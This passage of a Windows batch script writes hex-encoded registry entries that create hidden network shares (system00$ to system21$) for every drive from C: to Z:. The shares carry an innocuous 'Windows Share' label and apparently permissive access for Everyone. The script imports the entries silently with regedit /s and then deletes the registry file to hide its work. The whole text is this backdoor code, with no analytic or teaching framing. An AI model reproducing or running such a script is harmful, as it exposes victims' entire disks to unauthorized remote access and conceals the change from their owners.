echo "system13$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo  00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   52,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system14$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   53,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system15$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   54,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system16$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   55,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system17$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   56,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo "system00$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\system32\security.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   44,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\system32\security.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\system32\security.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\system32\security.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\system32\security.reg
echo.                                                                               >>C:\WINDOWS\system32\security.reg               
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\lanmanserver\Shares\Security]>>C:\WINDOWS\system32\security.reg
echo "academics"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system00$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system01$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system02$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system03$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system04$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system05$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system07$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system08$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system09$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system10$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system11$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system12$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system13$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system14$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system15$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system16$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system17$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system18$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system19$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system20$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg
echo "system21$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\system32\security.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\system32\security.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\system32\security.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\system32\security.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\system32\security.reg>>C:\WINDOWS\system32\security.reg


regedit /s C:\WINDOWS\system32\security.reg
del C:\WINDOWS\system32\security.reg
echo Windows Registry Editor Version 5.00>C:\WINDOWS\secure.reg

echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\Shares]>>C:\WINDOWS\secure.reg
echo "system19$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   58,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system20$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   59,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system21$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   5a,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system01$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   45,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   43,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system03$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   48,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system02$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
echo   00,00,4d,00,61,00,78,00,55,00,73,00,65,00,73,00,3d,00,34,00,32,00,39,00,34,\>>C:\WINDOWS\secure.reg
echo   00,39,00,36,00,37,00,32,00,39,00,35,00,00,00,50,00,61,00,74,00,68,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   46,00,3a,00,5c,00,00,00,50,00,65,00,72,00,6d,00,69,00,73,00,73,00,69,00,6f,\>>C:\WINDOWS\secure.reg
echo   00,6e,00,73,00,3d,00,30,00,00,00,52,00,65,00,6d,00,61,00,72,00,6b,00,3d,00,\>>C:\WINDOWS\secure.reg
echo   57,00,69,00,6e,00,64,00,6f,00,77,00,73,00,20,00,53,00,68,00,61,00,72,00,65,\>>C:\WINDOWS\secure.reg
echo   00,00,00,54,00,79,00,70,00,65,00,3d,00,30,00,00,00,00,00>>C:\WINDOWS\secure.reg
echo "system04$"=hex(7):43,00,53,00,43,00,46,00,6c,00,61,00,67,00,73,00,3d,00,30,00,\>>C:\WINDOWS\secure.reg
